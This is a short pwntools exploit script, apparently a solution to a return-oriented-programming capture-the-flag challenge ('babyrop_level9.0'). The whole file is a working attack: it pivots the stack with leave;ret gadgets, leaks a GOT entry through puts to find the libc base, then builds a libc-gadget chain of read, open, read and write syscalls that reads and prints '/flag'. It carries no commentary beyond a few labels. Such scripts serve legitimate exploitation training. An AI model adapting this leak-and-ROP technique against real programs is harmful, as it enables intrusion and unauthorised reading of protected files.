from pwn import *

r = process('/challenge/babyrop_level9.0')

leave_ret = 0x4027a1
buffer = 0x4150e0 + 0x18
puts = 0x401120
put_got = 0x405028
pop_rdi = 0x4028c3
pop_rbp =0x40129d
challenge =0x402833

payload = p64(pop_rbp) + p64(buffer) + p64(leave_ret) ## 0x18 memcpy to stack
payload += p64(buffer+0x100) + p64(pop_rdi) + p64(put_got) + p64(puts) + p64(challenge)
r.send(payload)

r.recvuntil(b'Leaving!\n')
libc = u64(r.recv(6)+b'\x00\x00') - 0x875a0
print(hex(libc))

## gadget
pop_rsi = libc + 0x27529
pop_rdx_r12 = libc + 0x11c371
pop_rax = libc + 0x4a550
syscall = libc + 0x66229

payload = p64(pop_rbp) + p64(buffer+0x50) + p64(leave_ret)
payload += b'\x00'*0x58 
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(0)+ p64(pop_rsi) + p64(buffer+0x200) + p64(pop_rdx_r12) + p64(0x10) + p64(0) + p64(syscall)
payload += p64(pop_rax) + p64(2) + p64(pop_rdi) + p64(buffer+0x200)+ p64(pop_rsi) + p64(0) + p64(pop_rdx_r12) + p64(0) + p64(0) + p64(syscall) #open 
payload += p64(pop_rax) + p64(0) + p64(pop_rdi) + p64(3)+ p64(pop_rsi) + p64(buffer+0x200) + p64(pop_rdx_r12) + p64(0x40) + p64(0)  + p64(syscall) #read 
payload += p64(pop_rax) + p64(1) + p64(pop_rdi) + p64(1)+ p64(pop_rsi) + p64(buffer+0x200) + p64(pop_rdx_r12) + p64(0x40) + p64(0)  + p64(syscall) #write
r.send(payload)
r.send(b'/flag')
r.interactive()